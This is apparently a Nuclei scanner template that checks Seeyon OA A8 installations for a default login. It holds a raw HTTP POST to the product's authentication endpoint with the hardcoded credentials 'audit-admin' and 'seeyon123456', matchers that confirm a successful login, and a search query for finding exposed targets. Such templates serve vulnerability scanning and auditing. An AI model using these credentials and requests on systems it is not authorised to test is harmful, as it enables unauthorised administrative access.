id: seeyon-a8-default-login

info:
  name: Seeyon OA A8 - Default Login
  author: SleepingBag945
  severity: high
  description: |
    Seeyon (seeyon) OA A8+ Enterprise Edition has a weak password vulnerability, which can be used to log in to the background
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="致远互联-OA"
  tags: seeyon,oa,default-login

http:
  - raw:
      - |
        POST /seeyon/rest/authentication/ucpcLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        UserAgentFrom=iphone&login_username={{username}}&login_password={{password}}

    payloads:
      username:
        - 'audit-admin'
      password:
        - 'seeyon123456'
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"LoginOK\":\"ok\""
          - "audit-admin"
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
# digest: 490a00463044022051cb70bc7b05a150f97c3a457d05670bd035839bea6b43baa83b8492238cf93d022050876d4eb5d403d05d4f3636b097cd93cc9232db5142fee79b3d4bc139fc275b:922c64590222798bb761d5b6d8e72950